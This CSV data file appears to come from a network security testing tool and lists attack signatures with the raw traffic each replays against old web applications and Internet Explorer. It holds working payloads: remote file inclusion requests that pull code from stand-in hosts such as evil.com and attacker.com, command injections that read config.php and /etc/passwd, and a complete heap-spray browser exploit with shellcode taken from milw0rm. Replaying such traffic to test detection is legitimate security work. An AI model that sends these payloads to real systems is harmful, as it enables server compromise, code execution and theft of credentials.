XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
horde_cmi_IPv6.xml,Horde help viewer module remote PHP code execution (IPv6 Version),This threat sends a crafted HTTP query containing an SQL statement which when executed by the server allows the injection of PHP code which will also be executed by the server when the inserted record is displayed. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿iprimal_cmi.xml,IPrimal Forums Index.PHP Authentication Bypass Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.iPrimal Forums is a web application that typically listens on port 80.,HTTP,TCP,POST /script/admin/index.php?p=members&edit=admin HTTP/1.0[[0D 0A ]]Host: www.example.com[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A ]]Content-Length: 373[[0D 0A 0D 0A ]]usersname=admin&password=passwd&email=test%40test.com&name=Dummy+user&tagline=Im+a+dumy+user&location=Ohio&bday=1983-11-20&j$[[0D 0A]]
iprimal_cmi.xml,IPrimal Forums Index.PHP Authentication Bypass Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.iPrimal Forums is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿iprimal_cmi_IPv6.xml,IPrimal Forums Index.PHP Authentication Bypass Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.iPrimal Forums is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,POST /script/admin/index.php?p=members&edit=admin HTTP/1.0[[0D 0A ]]Host: www.example.com[[0D 0A ]]Content-Type: application/x-www-form-urlencoded[[0D 0A ]]Content-Length: 373[[0D 0A 0D 0A ]]usersname=admin&password=passwd&email=test%40test.com&name=Dummy+user&tagline=Im+a+dumy+user&location=Ohio&bday=1983-11-20&j$[[0D 0A]]
iprimal_cmi_IPv6.xml,IPrimal Forums Index.PHP Authentication Bypass Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.iPrimal Forums is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿loudblog_cmi.xml,Loudblog backend_settings.php GLOBALS[path] Variable Remote File Inclusion,This threat sends a crafted URL that contains a command which is executed by the server. Loudblog is a we based application that typically listens on port 80.,HTTP,TCP,"POST /loudblog/loudblog/inc/backend_settings.php?cmd=cat+.%2F..%2Fconfig.php&GLOBALS[path]=http://www.gooogle.com HTTP/1.1[[0D 0A ]]Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a[[0D 0A ]]Host: www.stonedcoder.org[[0D 0A ]]User-Agent: Googlebot 2.1[[0D 0A ]]Content-Length: 166[[0D 0A ]]Connection: Close[[0D 0A 0D 0A ]]-----------------------------7d529a1d23092a[[0D 0A ]]Content-Disposition: form-data; name=""language""[[0D 0A ]]Content-Type:[[0D 0A 0D 0A ]]suntzu[[0D 0A ]]-----------------------------7d529a1d23092a--"
loudblog_cmi.xml,Loudblog backend_settings.php GLOBALS[path] Variable Remote File Inclusion,This threat sends a crafted URL that contains a command which is executed by the server. Loudblog is a we based application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿loudblog_cmi_IPv6.xml,Loudblog backend_settings.php GLOBALS[path] Variable Remote File Inclusion (IPv6 Version),This threat sends a crafted URL that contains a command which is executed by the server. Loudblog is a we based application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"POST /loudblog/loudblog/inc/backend_settings.php?cmd=cat+.%2F..%2Fconfig.php&GLOBALS[path]=http://www.gooogle.com HTTP/1.1[[0D 0A ]]Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a[[0D 0A ]]Host: www.stonedcoder.org[[0D 0A ]]User-Agent: Googlebot 2.1[[0D 0A ]]Content-Length: 166[[0D 0A ]]Connection: Close[[0D 0A 0D 0A ]]-----------------------------7d529a1d23092a[[0D 0A ]]Content-Disposition: form-data; name=""language""[[0D 0A ]]Content-Type:[[0D 0A 0D 0A ]]suntzu[[0D 0A ]]-----------------------------7d529a1d23092a--"
loudblog_cmi_IPv6.xml,Loudblog backend_settings.php GLOBALS[path] Variable Remote File Inclusion (IPv6 Version),This threat sends a crafted URL that contains a command which is executed by the server. Loudblog is a we based application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿mediagallery_geeklog_cmi.xml,Media Gallery for Geeklog <= 1.4.8a Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Media Gallery for Geeklog is a web application that typically listens on port 80.,HTTP,TCP,GET /mediagallery/public_html/maint/ftpmedia.php?_MG_CONF[path_html]=http://www.evil.com/cmd.txt? HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
mediagallery_geeklog_cmi.xml,Media Gallery for Geeklog <= 1.4.8a Remote File Inclusion Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Media Gallery for Geeklog is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿mediagallery_geeklog_cmi_IPv6.xml,Media Gallery for Geeklog <= 1.4.8a Remote File Inclusion Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Media Gallery for Geeklog is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,GET /mediagallery/public_html/maint/ftpmedia.php?_MG_CONF[path_html]=http://www.evil.com/cmd.txt? HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
mediagallery_geeklog_cmi_IPv6.xml,Media Gallery for Geeklog <= 1.4.8a Remote File Inclusion Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Media Gallery for Geeklog is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿msie_xmlcore_cmi.xml,MS Internet Explorer 6/7 (XML Core Services)  Remote Code Execution Vulnerability,"This threat leverages a flaw in the setRequestHeader method in the XMLHTTP (XML HTTP) ActiveX Control 4.0 in Microsoft XML Core Services 4.0 on Windows, when accessed by Internet Explorer, allows remote code execution on the client host. This affects Internet Explorer Web Browser clients that typically connect to the http port 80.",HTTP,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
msie_xmlcore_cmi.xml,MS Internet Explorer 6/7 (XML Core Services)  Remote Code Execution Vulnerability,"This threat leverages a flaw in the setRequestHeader method in the XMLHTTP (XML HTTP) ActiveX Control 4.0 in Microsoft XML Core Services 4.0 on Windows, when accessed by Internet Explorer, allows remote code execution on the client host. This affects Internet Explorer Web Browser clients that typically connect to the http port 80.",HTTP,TCP,"<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1 plus 2.0//EN"">[[0D 0A ]]<!--[[0D 0A ]]MS Internet Explorer 6/7 (XML Core Services)  Remote Code Execution Exploit[[0D 0A 0D 0A ]]Author: n/a[[0D 0A 0D 0A ]]Info:[[0D 0A ]]http://blogs.securiteam.com/index.php/archives/721[[0D 0A ]]http://isc.sans.org/diary.php?storyid=1823[[0D 0A ]]http://xforce.iss.net/xforce/alerts/id/239[[0D 0A 0D 0A ]]Found in the wild and was pointed out on securiteam's blog (cheers Gadi Evron!)[[0D 0A 0D 0A ]]Changed up the shellcode so it wouldn't be as evil for the viewers, calc.exe is called.[[0D 0A 0D 0A ]]/str0ke[[0D 0A ]]-->[[0D 0A 0D 0A ]]<html xmlns=""http://www.w3.org/1999/xhtml"">[[0D 0A ]]<body>[[0D 0A ]]<object id=target classid=""CLSID:{88d969c5-f192-11d4-a65f-0040963251e5}"" >[[0D 0A ]]</object>[[0D 0A ]]<script>[[0D 0A ]]var obj = null;[[0D 0A ]]function exploit() {[[0D 0A ]]obj = document.getElementById('target').object;[[0D 0A 0D 0A ]]try {[[0D 0A ]]obj.open(new Array(),new Array(),new Array(),new Array(),new Array());[[0D 0A ]]} catch(e) {};[[0D 0A 0D 0A ]]sh = unescape (""%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090"" +[[0D 0A 09 ]]""%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120"" +[[0D 0A 09 ]]""%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424"" +[[0D 0A 09 ]]""%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304"" +[[0D 0A 09 ]]""%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0"" +[[0D 0A 09 ]]""%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A"" +[[0D 0A 09 ]]""%uFF57%u63E7%u6C61%u0063"");[[0D 0A 0D 0A ]]sz = sh.length * 2;[[0D 0A ]]npsz = 0x400000-(sz+0x38);[[0D 0A ]]nps = unescape (""%u0D0D%u0D0D"");[[0D 0A ]]while (nps.length*2<npsz) nps+=nps;[[0D 0A ]]ihbc = (0x12000000-0x400000)/0x400000;[[0D 0A ]]mm = new Array();[[0D 0A ]]for (i=0;i<ihbc;i++) mm[i] = nps+sh;[[0D 0A 0D 0A ]]obj.open(new Object(),new Object(),new Object(),new Object(), new Object());    [[0D 0A 0D 0A ]]obj.setRequestHeader(new Object(),'......');[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]}[[0D 0A ]]</script>[[0D 0A ]]<body onLoad='exploit()' value='Exploit'>[[0D 0A 0D 0A ]]</body></html>[[0D 0A 0D 0A ]]# milw0rm.com [2006-11-08][[0D 0A]]"
﻿msie_xmlcore_cmi_IPv6.xml,MS Internet Explorer 6/7 (XML Core Services)  Remote Code Execution Vulnerability (IPv6 Version),"This threat leverages a flaw in the setRequestHeader method in the XMLHTTP (XML HTTP) ActiveX Control 4.0 in Microsoft XML Core Services 4.0 on Windows, when accessed by Internet Explorer, allows remote code execution on the client host. This affects Internet Explorer Web Browser clients that typically connect to the http port 80. (IPv6 Version)",HTTP/IPv6,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
msie_xmlcore_cmi_IPv6.xml,MS Internet Explorer 6/7 (XML Core Services)  Remote Code Execution Vulnerability (IPv6 Version),"This threat leverages a flaw in the setRequestHeader method in the XMLHTTP (XML HTTP) ActiveX Control 4.0 in Microsoft XML Core Services 4.0 on Windows, when accessed by Internet Explorer, allows remote code execution on the client host. This affects Internet Explorer Web Browser clients that typically connect to the http port 80. (IPv6 Version)",HTTP/IPv6,TCP,"<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1 plus 2.0//EN"">[[0D 0A ]]<!--[[0D 0A ]]MS Internet Explorer 6/7 (XML Core Services)  Remote Code Execution Exploit[[0D 0A 0D 0A ]]Author: n/a[[0D 0A 0D 0A ]]Info:[[0D 0A ]]http://blogs.securiteam.com/index.php/archives/721[[0D 0A ]]http://isc.sans.org/diary.php?storyid=1823[[0D 0A ]]http://xforce.iss.net/xforce/alerts/id/239[[0D 0A 0D 0A ]]Found in the wild and was pointed out on securiteam's blog (cheers Gadi Evron!)[[0D 0A 0D 0A ]]Changed up the shellcode so it wouldn't be as evil for the viewers, calc.exe is called.[[0D 0A 0D 0A ]]/str0ke[[0D 0A ]]-->[[0D 0A 0D 0A ]]<html xmlns=""http://www.w3.org/1999/xhtml"">[[0D 0A ]]<body>[[0D 0A ]]<object id=target classid=""CLSID:{88d969c5-f192-11d4-a65f-0040963251e5}"" >[[0D 0A ]]</object>[[0D 0A ]]<script>[[0D 0A ]]var obj = null;[[0D 0A ]]function exploit() {[[0D 0A ]]obj = document.getElementById('target').object;[[0D 0A 0D 0A ]]try {[[0D 0A ]]obj.open(new Array(),new Array(),new Array(),new Array(),new Array());[[0D 0A ]]} catch(e) {};[[0D 0A 0D 0A ]]sh = unescape (""%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090"" +[[0D 0A 09 ]]""%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120"" +[[0D 0A 09 ]]""%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424"" +[[0D 0A 09 ]]""%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304"" +[[0D 0A 09 ]]""%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0"" +[[0D 0A 09 ]]""%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A"" +[[0D 0A 09 ]]""%uFF57%u63E7%u6C61%u0063"");[[0D 0A 0D 0A ]]sz = sh.length * 2;[[0D 0A ]]npsz = 0x400000-(sz+0x38);[[0D 0A ]]nps = unescape (""%u0D0D%u0D0D"");[[0D 0A ]]while (nps.length*2<npsz) nps+=nps;[[0D 0A ]]ihbc = (0x12000000-0x400000)/0x400000;[[0D 0A ]]mm = new Array();[[0D 0A ]]for (i=0;i<ihbc;i++) mm[i] = nps+sh;[[0D 0A 0D 0A ]]obj.open(new Object(),new Object(),new Object(),new Object(), new Object());    [[0D 0A 0D 0A ]]obj.setRequestHeader(new Object(),'......');[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]obj.setRequestHeader(new Object(),0x12345678);[[0D 0A ]]}[[0D 0A ]]</script>[[0D 0A ]]<body onLoad='exploit()' value='Exploit'>[[0D 0A 0D 0A ]]</body></html>[[0D 0A 0D 0A ]]# milw0rm.com [2006-11-08][[0D 0A]]"
﻿mysql_commander_cmi.xml,MySQL Commander <= 2.7 (home) Remote File Inclusion Vulnerability,This threat sends a crafted url string containing a path to an arbitrary script file which is included by the server and executed on the affected server. MySQL Commander is a web application that typically listens on port 80.,HTTP,TCP,GET /ressourcen/dbopen.php?home=http://attacker.com/evil.txt? HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
mysql_commander_cmi.xml,MySQL Commander <= 2.7 (home) Remote File Inclusion Vulnerability,This threat sends a crafted url string containing a path to an arbitrary script file which is included by the server and executed on the affected server. MySQL Commander is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿mysql_commander_cmi_IPv6.xml,MySQL Commander <= 2.7 (home) Remote File Inclusion Vulnerability (IPv6 Version),This threat sends a crafted url string containing a path to an arbitrary script file which is included by the server and executed on the affected server. MySQL Commander is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,GET /ressourcen/dbopen.php?home=http://attacker.com/evil.txt? HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
mysql_commander_cmi_IPv6.xml,MySQL Commander <= 2.7 (home) Remote File Inclusion Vulnerability (IPv6 Version),This threat sends a crafted url string containing a path to an arbitrary script file which is included by the server and executed on the affected server. MySQL Commander is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿nettools_cmi.xml,PHP Net Tools 2.7.1 Remote Code Execution Exploit,This threat exploits the fact that arguments passed to the script are not filtered properly in order to prevent execution of arbitrary commands when calling system(). PHP Net Tools is a web application which typically listens on port 80.,HTTP,TCP,"POST /nettools//nettools.php HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT  5.0)[[0D 0A ]]Content-Length: 34..Content-Type: application/x-www-form-urlencoded[[0D 0A 0D 0A ]]ping=1&host=%7Ccat+%2Fetc%2Fpasswd[[0D 0A]]"
